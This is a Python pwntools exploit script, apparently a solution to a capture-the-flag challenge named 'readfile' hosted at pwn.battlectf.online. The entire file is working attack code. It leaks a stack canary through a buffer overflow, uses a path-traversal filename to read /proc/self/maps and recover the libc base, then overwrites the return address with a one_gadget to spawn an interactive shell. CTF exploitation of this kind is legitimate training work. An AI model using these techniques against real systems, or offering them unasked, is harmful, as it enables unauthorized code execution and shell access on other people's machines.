#!/usr/bin/python3

from pwn import *

exe = ELF('readfile', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.LOCAL:
	p = process(exe.path)
else:
	p = remote('pwn.battlectf.online', 1000)

############################
### Stage 1: Leak canary ###
############################
sa(b'name: ', b'A'*0x29)
sla(b'> ', b'1')
sa(b'name: ', b'A'*0x30)
p.recvuntil(b'A'*0x58)
canary = (u64(p.recv(8)) >> 8) << 8
info("Canary: " + hex(canary))

##############################################
### Stage 2: Leak libc via /proc/self/maps ###
##############################################
sla(b'> ', b'1')
sa(b'name: ', b'../../../' + b'./'*12 + b'proc/self/maps')
output = p.recvuntil(b'libc.so.6').split(b'\n')[-1]
libc.address = int(output[:output.index(b'-')], 16)
info("Libc base: " + hex(libc.address))

##########################################
### Stage 3: Get shell with one_gadget ###
##########################################
sla(b'> ', b'2')
payload = flat(
	b'A'*0x28,
	canary,
	0,
	libc.address + 0x50a37
	)
sla(b'feedback: ', payload)

p.interactive()
